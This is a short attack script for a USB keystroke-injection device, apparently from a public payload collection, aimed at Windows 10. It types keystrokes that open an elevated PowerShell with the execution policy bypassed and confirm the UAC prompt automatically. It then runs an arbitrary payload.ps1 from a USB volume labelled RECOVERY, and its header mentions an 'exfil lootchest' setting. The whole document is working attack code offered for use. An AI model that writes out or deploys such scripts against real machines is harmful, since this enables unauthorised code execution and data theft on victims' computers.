// =============================================================================
// Title: Run .ps1 From SD card.
// Author: @beigeworm | https://github.com/beigeworm
// Description: Run any .ps1 file from the SD card.
// Target: Windows 10
// =============================================================================

// *USB SETTING*
// exfil lootchest [REQUIRERD]

// =============================================================================

// Script Setup
layout('us'); 
// typingSpeed(1,1);

// Main Payload
press("GUI r");
delay(1000);
type("powershell -NoP -NonI -Exec Bypass");
delay(500);
press("CONTROL SHIFT ENTER");
delay(2000);
press("ALT y");
delay(4000);

function assurePS32() {
  type("if ([IntPtr]::Size -ne 4){& $env:SystemRoot\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe}\n");
  delay(1000);
}
assurePS32(); // open a 32bit console, if the current one is 64bit
delay(2000);
type("cmd /C start /MIN $env:SystemRoot\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -exec Bypass .((gwmi win32_volume -f 'label=''RECOVERY''').Name+'\\payload.ps1')")
delay(1000);
press("ENTER")